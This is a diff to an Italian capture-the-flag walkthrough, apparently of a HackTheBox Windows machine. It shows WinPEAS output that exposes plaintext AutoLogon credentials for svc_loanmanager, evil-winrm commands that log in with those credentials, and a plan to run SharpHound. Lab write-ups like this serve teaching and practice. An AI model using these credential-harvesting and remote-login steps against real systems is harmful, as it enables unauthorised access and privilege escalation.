@@ -71,10 +71,22 @@ evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
 
 e prelevo il primo flag! 
 
-Con winenum trovo:
 
-EGOTISTICALBANK   EGOTISTICALBANK\svc_loanmanager Moneymakestheworldgoround!
+A questo punto uso WinPEAS per enumerare tutte le vulnerabilità presenti per il PrivEsc. 
+Trovo le credenziali in chiaro per svc_loanmanager:
 
-Quindi:
+```
+[+] Looking for AutoLogon credentials(T1012)
+    Some AutoLogon credentials were found!!
+    DefaultDomainName             :  35mEGOTISTICALBANK
+    DefaultUserName               :  35mEGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  Moneymakestheworldgoround!
+```
 
-sudo evil-winrm -u svc_loanmanager -p Moneymakestheworldgoround! -i 10.10.10.175
+Lancio il comando per collegarmi:
+
+```
+sudo evil-winrm -u svc_loanmgr -p Moneymakestheworldgoround! -i 10.10.10.175
+```
+
+E potroò così runnare SharpHound.exe
